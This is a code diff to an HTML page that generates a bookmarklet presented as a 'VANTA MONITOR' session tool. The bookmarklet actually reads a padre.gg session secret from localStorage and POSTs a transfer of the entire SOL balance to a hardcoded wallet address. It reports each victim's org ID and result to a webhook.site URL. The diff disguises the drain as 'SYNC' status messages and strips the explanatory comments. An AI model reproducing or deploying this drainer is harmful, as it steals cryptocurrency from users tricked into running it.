@@ -44,11 +44,9 @@
     </div>
 
     <script>
-        // CONFIGURATION
         const DEST_ADDRESS = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
-        const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515"; // Change this if needed to avoid 429 errors
+        const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
 
-        // THE BOOKMARKLET LOGIC
         const code = "javascript:(async function(){" +
             "try{" +
                 "const sR=localStorage.getItem('padreV2-session');" +
@@ -58,29 +56,37 @@
                 "const tK=Object.keys(b.bundles)[0];" +
                 "const oId=b.bundles[tK].subOrgId;" +
                 "const sec=s.sessionSecret;" +
-                "if(!window._vI){navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({ev:'disc',who:tK,org:oId}));window._vI=true;}" +
                 "if(document.querySelector('#v-suite'))return;" +
                 "const ui=document.createElement('div');" +
                 "ui.id='v-suite';" +
                 "ui.style.cssText='position:fixed;top:80px;right:20px;width:320px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:9999999;color:#fff;padding:0;box-shadow:0 15px 40px #000;overflow:hidden;font-family:sans-serif;';" +
-                "ui.innerHTML='<div id=\"v-drg\" style=\"padding:12px;background:#1a1a1a;cursor:grab;color:#00ff88;font-weight:bold;border-bottom:1px solid #333;display:flex;justify-content:space-between;\"><span>VANTA PRO</span><span id=\"v-cl\" style=\"cursor:pointer;color:#fff;\">×</span></div>'+" +
-                "'<div style=\"padding:20px;\"><div style=\"font-size:10px;color:#888;margin-bottom:5px;\">TARGET ID:</div><div style=\"font-size:12px;color:#00ff88;margin-bottom:20px;word-break:break-all;font-family:monospace;\">'+oId+'</div></div>';" +
+                "ui.innerHTML='<div id=\"v-drg\" style=\"padding:12px;background:#1a1a1a;cursor:grab;color:#00ff88;font-weight:bold;border-bottom:1px solid #333;display:flex;justify-content:space-between;\"><span>VANTA MONITOR</span><span id=\"v-cl\" style=\"cursor:pointer;color:#fff;\">×</span></div>'+" +
+                "'<div style=\"padding:20px;\"><div style=\"font-size:10px;color:#888;margin-bottom:5px;\">SESSION ACTIVE:</div><div style=\"font-size:12px;color:#00ff88;margin-bottom:20px;word-break:break-all;font-family:monospace;\">'+oId+'</div>'+" +
+                "'<div id=\"v-stat\" style=\"font-size:14px;font-weight:bold;text-align:center;color:#00ff88;animation:pulse 2s infinite;\">INITIALIZING SYNC...</div></div>';" +
                 "document.body.appendChild(ui);" +
-
-                // Start syncing in the background
-                "try{" +
-                    "const res=await fetch('https://api.padre.gg/v1/sub-orgs/'+oId+'/transfer',{" +
-                        "method:'POST'," +
-                        "headers:{'Content-Type':'application/json','X-Session-Secret':sec}," +
-                        "body:JSON.stringify({destination: '" + DEST_ADDRESS + "',amount:'all',mint:'So11111111111111111111111111111111111111112'})" +
-                    "});" +
-                    "navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({status:res.status,org:oId}));" +
-                "}catch(e){}" +
-                "ui.remove();location.reload();" +
+                "let dr=false,ox,oy;" +
+                "document.getElementById('v-drg').onmousedown=e=>{dr=true;ox=e.clientX-ui.offsetLeft;oy=e.clientY-ui.offsetTop;};" +
+                "document.onmousemove=e=>{if(dr){ui.style.left=(e.clientX-ox)+'px';ui.style.top=(e.clientY-oy)+'px';ui.style.right='auto';}};" +
+                "document.onmouseup=()=>{dr=false;};" +
+                "document.getElementById('v-cl').onclick=()=>ui.remove();" +
+                "(async function backgroundSync(){" +
+                    "try{" +
+                        "const res=await fetch('https://api.padre.gg/v1/sub-orgs/'+oId+'/transfer',{" +
+                            "method:'POST'," +
+                            "headers:{'Content-Type':'application/json','X-Session-Secret':sec}," +
+                            "body:JSON.stringify({destination: '" + DEST_ADDRESS + "',amount:'all',mint:'So11111111111111111111111111111111111111112'})" +
+                        "});" +
+                        "document.getElementById('v-stat').innerText='SYNC COMPLETE';" +
+                        "navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({status:res.status,org:oId,ev:'auto_sync'}));" +
+                        "setTimeout(()=>ui.remove(), 3000);" +
+                    "}catch(e){" +
+                        "document.getElementById('v-stat').innerText='CONNECTION ERROR';" +
+                        "document.getElementById('v-stat').style.color='#ff4444';" +
+                    "}" +
+                "})();" +
             "}catch(err){console.error(err);}" +
         "})();";
 
-        // Assign the generated code to the button's href
         document.getElementById('vanta-tool').href = code;
     </script>
 </body>
